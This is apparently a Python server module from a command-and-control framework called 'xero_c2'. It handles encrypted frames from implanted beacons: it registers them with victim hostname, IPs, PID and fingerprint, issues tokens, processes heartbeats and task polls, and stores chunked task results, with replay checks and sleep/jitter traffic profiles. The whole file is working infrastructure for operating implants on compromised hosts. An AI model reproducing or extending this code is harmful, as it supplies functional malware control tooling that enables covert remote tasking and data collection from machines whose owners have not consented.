from __future__ import annotations

import base64
import uuid

from fastapi import HTTPException, status
from fastapi.responses import JSONResponse, Response
from pydantic import ValidationError
from sqlalchemy import select
from sqlalchemy.orm import Session
from xero_common.models import utc_now
from xero_common.security import generate_beacon_token, hash_beacon_token

from xero_c2.beacon_liveness import (
    BEACON_EVENT_REASON_HEARTBEAT,
    BEACON_STATUS_ONLINE,
    apply_runtime_metadata,
    record_status_transition,
)
from xero_c2.models import Beacon, ProtocolFrameReceipt, ProtocolSecurityEvent
from xero_c2.protocol import (
    CURRENT_PROTOCOL_VERSION,
    HEARTBEAT,
    REGISTER,
    TASK_POLL,
    TASK_RESULT,
    DecodedFrame,
    ProtocolError,
    encode_frame,
    load_private_key,
)
from xero_c2.protocol.constants import FRAME_HEADER, FRAME_HMAC_LENGTH, PROTOCOL_MAGIC
from xero_c2.schemas import BeaconHeartbeatRequest, BeaconRegistrationRequest
from xero_c2.task_queue import apply_task_result, public_task, task_event_type
from xero_c2.task_results import (
    RESULT_EVENT_CHUNK,
    RESULT_EVENT_COMPLETED,
    ingest_task_result_payload,
    is_chunk_payload,
    public_task_result_chunk,
    task_for_result_payload,
    task_result_chunk_for_payload,
    task_result_event_payload,
)
from xero_c2.traffic_profiles import profile_ack_fields


def protocol_supported_versions(settings) -> list[int]:
    return [int(item) for item in settings.protocol_supported_versions.split(",")]


def c2_protocol_private_key(settings):
    try:
        return load_private_key(settings.protocol_private_key_b64)
    except ProtocolError as exc:
        raise HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, detail=exc.message) from exc


def frame_metadata(frame: bytes) -> dict[str, str | int] | None:
    if len(frame) < FRAME_HEADER.size + FRAME_HMAC_LENGTH:
        return None
    try:
        magic, version, message_type, _, header_length, payload_length, session_bytes, nonce, _ = FRAME_HEADER.unpack(
            frame[: FRAME_HEADER.size]
        )
    except Exception:
        return None
    if magic != PROTOCOL_MAGIC:
        return None
    return {
        "version": version,
        "message_type": message_type,
        "header_length": header_length,
        "payload_length": payload_length,
        "session_id": str(uuid.UUID(bytes=session_bytes)),
        "nonce": nonce.hex(),
    }


def record_protocol_security_event(
    session: Session,
    *,
    event_type: str,
    severity: str,
    message: str,
    beacon_id: uuid.UUID | None = None,
    session_id: str | None = None,
    nonce: str | None = None,
) -> ProtocolSecurityEvent:
    event = ProtocolSecurityEvent(
        beacon_id=beacon_id,
        event_type=event_type,
        severity=severity,
        message=message[:512],
        session_id=session_id,
        nonce=nonce,
    )
    session.add(event)
    return event


def protocol_error_response(exc: ProtocolError) -> JSONResponse:
    return JSONResponse(
        status_code=exc.status_code,
        content={"detail": "PROTOCOL_ERROR", "code": exc.code, "message": exc.message},
    )


def encrypted_protocol_frame(settings, decoded: DecodedFrame, message_type: str, payload: dict) -> bytes:
    private_key = c2_protocol_private_key(settings)
    return encode_frame(
        private_key=private_key,
        peer_public_key=decoded.sender_public_key,
        message_type=message_type,
        payload=payload,
        session_id=decoded.session_id,
        max_frame_bytes=settings.protocol_max_frame_bytes,
    )


def encrypted_protocol_response(settings, decoded: DecodedFrame, message_type: str, payload: dict) -> Response:
    frame = encrypted_protocol_frame(settings, decoded, message_type, payload)
    return Response(content=frame, media_type="application/octet-stream")


def record_protocol_error(
    session: Session,
    exc: ProtocolError,
    metadata: dict[str, str | int] | None,
    *,
    beacon_id: uuid.UUID | None = None,
) -> None:
    record_protocol_security_event(
        session,
        event_type=f"protocol.{exc.code.lower()}",
        severity="high" if exc.code in {"HMAC_MISMATCH", "REPLAY_DETECTED"} else "medium",
        message=exc.message,
        beacon_id=beacon_id,
        session_id=str(metadata["session_id"]) if metadata and metadata.get("session_id") else None,
        nonce=str(metadata["nonce"]) if metadata and metadata.get("nonce") else None,
    )


def ensure_nonce_not_replayed(session: Session, metadata: dict[str, str | int] | None) -> None:
    if metadata is None:
        return
    existing = session.execute(
        select(ProtocolFrameReceipt).where(
            ProtocolFrameReceipt.session_id == metadata["session_id"],
            ProtocolFrameReceipt.nonce == metadata["nonce"],
        )
    ).scalar_one_or_none()
    if existing is not None:
        raise ProtocolError("REPLAY_DETECTED", "Replay nonce rejected", status_code=status.HTTP_409_CONFLICT)


def record_frame_receipt(
    session: Session,
    decoded: DecodedFrame,
    *,
    beacon_id: uuid.UUID | None,
) -> ProtocolFrameReceipt:
    receipt = ProtocolFrameReceipt(
        beacon_id=beacon_id,
        message_type=decoded.message_type,
        session_id=str(decoded.session_id),
        nonce=decoded.nonce.hex(),
        payload_digest=decoded.payload_digest,
        payload_size=decoded.payload_length,
    )
    session.add(receipt)
    return receipt


def selected_protocol_version(settings, payload: dict) -> int:
    offered = payload.get("supported_versions", [CURRENT_PROTOCOL_VERSION])
    if not isinstance(offered, list) or not all(isinstance(item, int) for item in offered):
        raise ProtocolError("INVALID_PAYLOAD", "REGISTER supported_versions must be a list of integers")
    supported = protocol_supported_versions(settings)
    candidates = sorted(set(offered).intersection(supported), reverse=True)
    if not candidates:
        raise ProtocolError("UNSUPPORTED_VERSION", "No compatible protocol version offered")
    return candidates[0]


def process_protocol_register(
    session: Session,
    settings,
    decoded: DecodedFrame,
    *,
    transport_mode: str = "rest",
    transport_connected: bool = False,
) -> tuple[uuid.UUID, dict]:
    payload = decoded.payload
    selected_version = selected_protocol_version(settings, payload)
    try:
        registration = BeaconRegistrationRequest.model_validate(payload)
    except ValidationError as exc:
        raise ProtocolError("INVALID_PAYLOAD", "REGISTER payload failed validation") from exc
    now = utc_now()
    beacon_token = generate_beacon_token()
    beacon_token_hash = hash_beacon_token(beacon_token)
    beacon = session.execute(
        select(Beacon).where(Beacon.machine_fingerprint_hash == registration.machine_fingerprint_hash)
    ).scalar_one_or_none()
    created = beacon is None
    if beacon is None:
        beacon = Beacon(
            machine_fingerprint_hash=registration.machine_fingerprint_hash,
            hostname=registration.hostname,
            os=registration.os,
            architecture=registration.architecture,
            internal_ip=registration.internal_ip,
            external_ip=registration.external_ip,
            pid=registration.pid,
            status=BEACON_STATUS_ONLINE,
            sleep_seconds=settings.beacon_default_sleep_seconds,
            jitter=settings.beacon_default_jitter,
            beacon_token_hash=beacon_token_hash,
            beacon_token_issued_at=now,
            first_seen=now,
            last_seen=now,
        )
    else:
        if beacon.removed_at is not None:
            raise ProtocolError(
                "BEACON_REMOVED",
                "Beacon has been removed",
                status_code=status.HTTP_410_GONE,
            )
        old_status = beacon.status
        beacon.hostname = registration.hostname
        beacon.os = registration.os
        beacon.architecture = registration.architecture
        beacon.internal_ip = registration.internal_ip
        beacon.external_ip = registration.external_ip
        beacon.pid = registration.pid
        beacon.status = BEACON_STATUS_ONLINE
        beacon.beacon_token_hash = beacon_token_hash
        beacon.beacon_token_issued_at = now
        beacon.last_seen = now
        record_status_transition(
            session,
            beacon,
            old_status=old_status,
            new_status=BEACON_STATUS_ONLINE,
            reason=BEACON_EVENT_REASON_HEARTBEAT,
            occurred_at=now,
        )
    beacon.protocol_version = selected_version
    beacon.protocol_session_id = str(decoded.session_id)
    beacon.protocol_peer_public_key_b64 = base64.b64encode(decoded.sender_public_key).decode("ascii")
    beacon.protocol_last_seen = now
    beacon.transport_mode = transport_mode
    beacon.transport_connected = transport_connected
    beacon.transport_last_seen = now
    session.add(beacon)
    session.flush()
    profile_fields = profile_ack_fields(session, settings, beacon)
    return beacon.id, {
        "status": "ok",
        "acknowledged_message_type": decoded.message_type,
        "beacon_id": str(beacon.id),
        "beacon_token": beacon_token,
        "selected_protocol_version": selected_version,
        "sleep": profile_fields["sleep"],
        "jitter": profile_fields["jitter"],
        "profile": profile_fields["profile"],
        "transport": transport_mode,
        "event_type": "beacon.registered" if created else "beacon.status.changed",
    }


def process_protocol_frame(
    session: Session,
    settings,
    decoded: DecodedFrame,
    *,
    transport_mode: str = "rest",
    transport_connected: bool = False,
) -> tuple[uuid.UUID | None, dict]:
    if decoded.message_type == REGISTER:
        return process_protocol_register(
            session,
            settings,
            decoded,
            transport_mode=transport_mode,
            transport_connected=transport_connected,
        )

    beacon_id: uuid.UUID | None = None
    beacon: Beacon | None = None
    raw_beacon_id = decoded.payload.get("beacon_id")
    if isinstance(raw_beacon_id, str):
        try:
            candidate_beacon_id = uuid.UUID(raw_beacon_id)
        except ValueError as exc:
            raise ProtocolError("INVALID_PAYLOAD", "beacon_id must be a UUID") from exc
        beacon = session.get(Beacon, candidate_beacon_id)
        if beacon is None:
            raise ProtocolError("UNKNOWN_BEACON", "Frame references an unknown beacon")
        if beacon.removed_at is not None:
            raise ProtocolError(
                "BEACON_REMOVED",
                "Beacon has been removed",
                status_code=status.HTTP_410_GONE,
            )
        now = utc_now()
        beacon_id = beacon.id
        if decoded.message_type == HEARTBEAT:
            try:
                heartbeat_payload = BeaconHeartbeatRequest.model_validate(decoded.payload)
            except ValidationError as exc:
                raise ProtocolError("INVALID_PAYLOAD", "HEARTBEAT payload failed validation") from exc
            old_status = beacon.status
            apply_runtime_metadata(beacon, heartbeat_payload)
            beacon.status = BEACON_STATUS_ONLINE
            beacon.last_seen = now
            record_status_transition(
                session,
                beacon,
                old_status=old_status,
                new_status=BEACON_STATUS_ONLINE,
                reason=BEACON_EVENT_REASON_HEARTBEAT,
                occurred_at=now,
            )
        beacon.protocol_version = decoded.version
        beacon.protocol_session_id = str(decoded.session_id)
        beacon.protocol_peer_public_key_b64 = base64.b64encode(decoded.sender_public_key).decode("ascii")
        beacon.protocol_last_seen = now
        beacon.transport_mode = transport_mode
        beacon.transport_connected = transport_connected
        beacon.transport_last_seen = now
        session.add(beacon)

    ack_payload = {
        "status": "ok",
        "acknowledged_message_type": decoded.message_type,
        "session_id": str(decoded.session_id),
        "transport": transport_mode,
    }
    if beacon is not None:
        ack_payload.update(profile_ack_fields(session, settings, beacon))
    if decoded.message_type == TASK_POLL:
        ack_payload["task"] = None
    if decoded.message_type == TASK_RESULT:
        if beacon_id is not None:
            task = task_for_result_payload(session, beacon_id=beacon_id, payload=decoded.payload)
            if task is not None:
                result = ingest_task_result_payload(session, settings, task, decoded.payload)
                if is_chunk_payload(decoded.payload):
                    chunk = task_result_chunk_for_payload(session, task, decoded.payload)
                    if chunk is not None:
                        ack_payload["task_result_chunk"] = public_task_result_chunk(chunk)
                        ack_payload["task_result_chunk_event_type"] = RESULT_EVENT_CHUNK
                if is_chunk_payload(decoded.payload) and result is None:
                    ack_payload["receipt"] = "chunk_stored"
                    return beacon_id, ack_payload
                task = apply_task_result(session, beacon_id=beacon_id, payload=decoded.payload)
                if task is not None:
                    ack_payload["task"] = public_task(task)
                    ack_payload["task_event_type"] = task_event_type(task.status)
                if result is not None:
                    ack_payload["task_result"] = task_result_event_payload(session, settings, result)
                    ack_payload["task_result_event_type"] = RESULT_EVENT_COMPLETED
        ack_payload["receipt"] = "stored"
    return beacon_id, ack_payload
